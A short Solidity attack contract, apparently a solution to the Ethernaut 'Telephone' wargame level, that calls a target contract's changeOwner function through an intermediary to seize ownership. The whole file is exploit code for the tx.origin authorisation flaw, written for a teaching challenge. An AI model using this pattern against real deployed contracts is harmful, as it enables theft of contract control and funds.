// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract HackTel {
    function hackTel(address _targetContractAddress, address _newOwner) public {
        Telephone cnt = Telephone(_targetContractAddress); 
        cnt.changeOwner(_newOwner);
    }
}